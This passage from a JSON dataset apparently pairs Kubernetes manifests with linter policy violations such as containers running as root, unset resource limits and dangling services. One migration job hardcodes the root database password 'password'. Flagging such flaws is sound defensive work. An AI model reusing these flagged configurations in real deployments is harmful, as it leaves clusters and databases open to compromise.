    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-mysql\" has cpu request 0"
  },
  {
    "id": "11244",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"devops-db-ctrl\" has memory limit 0"
  },
  {
    "id": "11245",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-mysql\" has memory limit 0"
  },
  {
    "id": "11246",
    "manifest_path": "data/manifests/the_stack_sample/sample_4336.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: ghproxy\n  labels:\n    app: ghproxy\nspec:\n  selector:\n    matchLabels:\n      app: ghproxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ghproxy\n    spec:\n      containers:\n      - name: ghproxy\n        image: gcr.io/k8s-prow/ghproxy:v20210902-01e03305a2\n        args:\n        - --cache-dir=/cache\n        - --cache-sizeGB=99\n        - --serve-metrics=true\n        ports:\n        - containerPort: 8888\n        volumeMounts:\n        - name: cache\n          mountPath: /cache\n      volumes:\n      - name: cache\n        persistentVolumeClaim:\n          claimName: ghproxy\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ghproxy\" does not have a read-only root file system"
  },
  {
    "id": "11247",
    "manifest_path": "data/manifests/the_stack_sample/sample_4336.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: ghproxy\n  labels:\n    app: ghproxy\nspec:\n  selector:\n    matchLabels:\n      app: ghproxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ghproxy\n    spec:\n      containers:\n      - name: ghproxy\n        image: gcr.io/k8s-prow/ghproxy:v20210902-01e03305a2\n        args:\n        - --cache-dir=/cache\n        - --cache-sizeGB=99\n        - --serve-metrics=true\n        ports:\n        - containerPort: 8888\n        volumeMounts:\n        - name: cache\n          mountPath: /cache\n      volumes:\n      - name: cache\n        persistentVolumeClaim:\n          claimName: ghproxy\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ghproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "11248",
    "manifest_path": "data/manifests/the_stack_sample/sample_4336.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: ghproxy\n  labels:\n    app: ghproxy\nspec:\n  selector:\n    matchLabels:\n      app: ghproxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ghproxy\n    spec:\n      containers:\n      - name: ghproxy\n        image: gcr.io/k8s-prow/ghproxy:v20210902-01e03305a2\n        args:\n        - --cache-dir=/cache\n        - --cache-sizeGB=99\n        - --serve-metrics=true\n        ports:\n        - containerPort: 8888\n        volumeMounts:\n        - name: cache\n          mountPath: /cache\n      volumes:\n      - name: cache\n        persistentVolumeClaim:\n          claimName: ghproxy\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ghproxy\" has cpu request 0"
  },
  {
    "id": "11249",
    "manifest_path": "data/manifests/the_stack_sample/sample_4336.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: ghproxy\n  labels:\n    app: ghproxy\nspec:\n  selector:\n    matchLabels:\n      app: ghproxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ghproxy\n    spec:\n      containers:\n      - name: ghproxy\n        image: gcr.io/k8s-prow/ghproxy:v20210902-01e03305a2\n        args:\n        - --cache-dir=/cache\n        - --cache-sizeGB=99\n        - --serve-metrics=true\n        ports:\n        - containerPort: 8888\n        volumeMounts:\n        - name: cache\n          mountPath: /cache\n      volumes:\n      - name: cache\n        persistentVolumeClaim:\n          claimName: ghproxy\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ghproxy\" has memory limit 0"
  },
  {
    "id": "11250",
    "manifest_path": "data/manifests/the_stack_sample/sample_4337.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9725\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11251",
    "manifest_path": "data/manifests/the_stack_sample/sample_4337.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9725\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11252",
    "manifest_path": "data/manifests/the_stack_sample/sample_4337.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9725\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11253",
    "manifest_path": "data/manifests/the_stack_sample/sample_4337.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9725\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11254",
    "manifest_path": "data/manifests/the_stack_sample/sample_4337.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9725\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11255",
    "manifest_path": "data/manifests/the_stack_sample/sample_4341.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: notes-app\n    name: frontend\n  name: frontend\nspec:\n  type: NodePort\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: notes-app\n    name: frontend-notes-app\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:notes-app name:frontend-notes-app])"
  },
  {
    "id": "11256",
    "manifest_path": "data/manifests/the_stack_sample/sample_4343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mongodb\n  labels:\n    app: crawler\n    component: mongo\nspec:\n  ports:\n  - port: 27017\n    protocol: TCP\n    targetPort: 27017\n  selector:\n    app: crawler\n    component: mongo\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:crawler component:mongo])"
  },
  {
    "id": "11257",
    "manifest_path": "data/manifests/the_stack_sample/sample_4344.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nginx-ingress-controller\n  namespace: ingress\nspec:\n  selector:\n    matchLabels:\n      name: nginx-ingress-controller\n      phase: prod\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-controller\n        phase: prod\n      annotations:\n        seccomp.security.alpha.kubernetes.io/pod: docker/default\n    spec:\n      containers:\n      - name: nginx-ingress-controller\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.25.1\n        args:\n        - /nginx-ingress-controller\n        - --ingress-class=public\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n        - name: https\n          containerPort: 443\n          hostPort: 443\n        - name: health\n          containerPort: 10254\n          hostPort: 10254\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-controller\" does not have a read-only root file system"
  },
  {
    "id": "11258",
    "manifest_path": "data/manifests/the_stack_sample/sample_4344.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nginx-ingress-controller\n  namespace: ingress\nspec:\n  selector:\n    matchLabels:\n      name: nginx-ingress-controller\n      phase: prod\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-controller\n        phase: prod\n      annotations:\n        seccomp.security.alpha.kubernetes.io/pod: docker/default\n    spec:\n      containers:\n      - name: nginx-ingress-controller\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.25.1\n        args:\n        - /nginx-ingress-controller\n        - --ingress-class=public\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n        - name: https\n          containerPort: 443\n          hostPort: 443\n        - name: health\n          containerPort: 10254\n          hostPort: 10254\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-controller\" has cpu request 0"
  },
  {
    "id": "11259",
    "manifest_path": "data/manifests/the_stack_sample/sample_4344.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nginx-ingress-controller\n  namespace: ingress\nspec:\n  selector:\n    matchLabels:\n      name: nginx-ingress-controller\n      phase: prod\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-controller\n        phase: prod\n      annotations:\n        seccomp.security.alpha.kubernetes.io/pod: docker/default\n    spec:\n      containers:\n      - name: nginx-ingress-controller\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.25.1\n        args:\n        - /nginx-ingress-controller\n        - --ingress-class=public\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - name: http\n          containerPort: 80\n          hostPort: 80\n        - name: https\n          containerPort: 443\n          hostPort: 443\n        - name: health\n          containerPort: 10254\n          hostPort: 10254\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress-controller\" has memory limit 0"
  },
  {
    "id": "11260",
    "manifest_path": "data/manifests/the_stack_sample/sample_4345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: abhipipelinesjavascriptdocker\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n  selector:\n    app: abhipipelinesjavascriptdocker\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:abhipipelinesjavascriptdocker])"
  },
  {
    "id": "11261",
    "manifest_path": "data/manifests/the_stack_sample/sample_4347.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alameda-operator\n  namespace: federatorai\n  labels:\n    app: alameda\n    component: alameda-operator\n  annotations:\n    description: Defines how to deploy the application alameda-operator\n    template.alpha.openshift.io/wait-for-ready: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: alameda-operator\n  template:\n    metadata:\n      name: alameda-operator\n      labels:\n        app: alameda\n        component: alameda-operator\n    spec:\n      containers:\n      - name: alameda-operator\n        image: quay.io/prophetstor/alameda-operator-ubi:v0.3.8\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        env:\n        - name: NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: ALAMEDA_OPERATOR_DATAHUB_ADDRESS\n          value: alameda-datahub.federatorai.svc:50050\n        volumeMounts:\n        - name: podinfo\n          mountPath: /etc/podinfo\n          readOnly: false\n        readinessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --readiness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --liveness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n      volumes:\n      - name: alameda-operator-data-storage\n      - name: alameda-operator-log-storage\n      - name: podinfo\n        downwardAPI:\n          items:\n          - path: labels\n            fieldRef:\n              fieldPath: metadata.labels\n      serviceAccount: alameda-operator\n      serviceAccountName: alameda-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"alameda-operator\" does not have a read-only root file system"
  },
  {
    "id": "11262",
    "manifest_path": "data/manifests/the_stack_sample/sample_4347.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alameda-operator\n  namespace: federatorai\n  labels:\n    app: alameda\n    component: alameda-operator\n  annotations:\n    description: Defines how to deploy the application alameda-operator\n    template.alpha.openshift.io/wait-for-ready: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: alameda-operator\n  template:\n    metadata:\n      name: alameda-operator\n      labels:\n        app: alameda\n        component: alameda-operator\n    spec:\n      containers:\n      - name: alameda-operator\n        image: quay.io/prophetstor/alameda-operator-ubi:v0.3.8\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        env:\n        - name: NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: ALAMEDA_OPERATOR_DATAHUB_ADDRESS\n          value: alameda-datahub.federatorai.svc:50050\n        volumeMounts:\n        - name: podinfo\n          mountPath: /etc/podinfo\n          readOnly: false\n        readinessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --readiness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --liveness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n      volumes:\n      - name: alameda-operator-data-storage\n      - name: alameda-operator-log-storage\n      - name: podinfo\n        downwardAPI:\n          items:\n          - path: labels\n            fieldRef:\n              fieldPath: metadata.labels\n      serviceAccount: alameda-operator\n      serviceAccountName: alameda-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"alameda-operator\" not found"
  },
  {
    "id": "11263",
    "manifest_path": "data/manifests/the_stack_sample/sample_4347.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alameda-operator\n  namespace: federatorai\n  labels:\n    app: alameda\n    component: alameda-operator\n  annotations:\n    description: Defines how to deploy the application alameda-operator\n    template.alpha.openshift.io/wait-for-ready: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: alameda-operator\n  template:\n    metadata:\n      name: alameda-operator\n      labels:\n        app: alameda\n        component: alameda-operator\n    spec:\n      containers:\n      - name: alameda-operator\n        image: quay.io/prophetstor/alameda-operator-ubi:v0.3.8\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        env:\n        - name: NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: ALAMEDA_OPERATOR_DATAHUB_ADDRESS\n          value: alameda-datahub.federatorai.svc:50050\n        volumeMounts:\n        - name: podinfo\n          mountPath: /etc/podinfo\n          readOnly: false\n        readinessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --readiness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --liveness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n      volumes:\n      - name: alameda-operator-data-storage\n      - name: alameda-operator-log-storage\n      - name: podinfo\n        downwardAPI:\n          items:\n          - path: labels\n            fieldRef:\n              fieldPath: metadata.labels\n      serviceAccount: alameda-operator\n      serviceAccountName: alameda-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"alameda-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "11264",
    "manifest_path": "data/manifests/the_stack_sample/sample_4347.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alameda-operator\n  namespace: federatorai\n  labels:\n    app: alameda\n    component: alameda-operator\n  annotations:\n    description: Defines how to deploy the application alameda-operator\n    template.alpha.openshift.io/wait-for-ready: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: alameda-operator\n  template:\n    metadata:\n      name: alameda-operator\n      labels:\n        app: alameda\n        component: alameda-operator\n    spec:\n      containers:\n      - name: alameda-operator\n        image: quay.io/prophetstor/alameda-operator-ubi:v0.3.8\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        env:\n        - name: NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: ALAMEDA_OPERATOR_DATAHUB_ADDRESS\n          value: alameda-datahub.federatorai.svc:50050\n        volumeMounts:\n        - name: podinfo\n          mountPath: /etc/podinfo\n          readOnly: false\n        readinessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --readiness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /usr/local/bin/manager\n            - --liveness-probe\n          initialDelaySeconds: 5\n          failureThreshold: 20\n          periodSeconds: 5\n      volumes:\n      - name: alameda-operator-data-storage\n      - name: alameda-operator-log-storage\n      - name: podinfo\n        downwardAPI:\n          items:\n          - path: labels\n            fieldRef:\n              fieldPath: metadata.labels\n      serviceAccount: alameda-operator\n      serviceAccountName: alameda-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"alameda-operator\" has memory limit 0"
  },
  {
    "id": "11265",
    "manifest_path": "data/manifests/the_stack_sample/sample_4348.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql-server\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: mysql-server\n        tier: db\n    spec:\n      containers:\n      - image: mysql:5.7\n        name: mysql-server\n        args:\n        - --ignore-db-dir=lost+found\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pv-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql-server\" does not have a read-only root file system"
  },
  {
    "id": "11266",
    "manifest_path": "data/manifests/the_stack_sample/sample_4348.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql-server\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: mysql-server\n        tier: db\n    spec:\n      containers:\n      - image: mysql:5.7\n        name: mysql-server\n        args:\n        - --ignore-db-dir=lost+found\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pv-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql-server\" is not set to runAsNonRoot"
  },
  {
    "id": "11267",
    "manifest_path": "data/manifests/the_stack_sample/sample_4348.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql-server\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: mysql-server\n        tier: db\n    spec:\n      containers:\n      - image: mysql:5.7\n        name: mysql-server\n        args:\n        - --ignore-db-dir=lost+found\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pv-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql-server\" has cpu request 0"
  },
  {
    "id": "11268",
    "manifest_path": "data/manifests/the_stack_sample/sample_4348.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql-server\n      tier: db\n  template:\n    metadata:\n      labels:\n        app: mysql-server\n        tier: db\n    spec:\n      containers:\n      - image: mysql:5.7\n        name: mysql-server\n        args:\n        - --ignore-db-dir=lost+found\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pv-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql-server\" has memory limit 0"
  },
  {
    "id": "11269",
    "manifest_path": "data/manifests/the_stack_sample/sample_4349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: explainshell-deployment\n  namespace: explainshell\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: explainshell-web\n  template:\n    metadata:\n      labels:\n        app: explainshell-web\n    spec:\n      containers:\n      - env:\n        - name: HOST_IP\n          value: 0.0.0.0\n        - name: MONGO_URI\n          value: mongodb://mongo-database-0.mongodb-service.explainshell.svc.cluster.local\n        - name: PYTHONPATH\n          value: /opt/webapp\n        command:\n        - /bin/bash\n        - -c\n        - \"apt-get update\\napt-get install -y make gcc \\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man1/\\npython explainshell/manager.py --log\\\n          \\ info /usr/share/man/man3/\\npython explainshell/manager.py --log info /usr/share/man/man5/\\n\\\n          python explainshell/manager.py --log info /usr/share/man/man7/\\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man8/\\nexec make serve\\n\"\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/explainshell_web:v1.0.1\n        name: explainshell-web\n        ports:\n        - containerPort: 5000\n        resources: {}\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11270",
    "manifest_path": "data/manifests/the_stack_sample/sample_4349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: explainshell-deployment\n  namespace: explainshell\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: explainshell-web\n  template:\n    metadata:\n      labels:\n        app: explainshell-web\n    spec:\n      containers:\n      - env:\n        - name: HOST_IP\n          value: 0.0.0.0\n        - name: MONGO_URI\n          value: mongodb://mongo-database-0.mongodb-service.explainshell.svc.cluster.local\n        - name: PYTHONPATH\n          value: /opt/webapp\n        command:\n        - /bin/bash\n        - -c\n        - \"apt-get update\\napt-get install -y make gcc \\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man1/\\npython explainshell/manager.py --log\\\n          \\ info /usr/share/man/man3/\\npython explainshell/manager.py --log info /usr/share/man/man5/\\n\\\n          python explainshell/manager.py --log info /usr/share/man/man7/\\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man8/\\nexec make serve\\n\"\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/explainshell_web:v1.0.1\n        name: explainshell-web\n        ports:\n        - containerPort: 5000\n        resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"explainshell-web\" does not have a read-only root file system"
  },
  {
    "id": "11271",
    "manifest_path": "data/manifests/the_stack_sample/sample_4349.yaml",
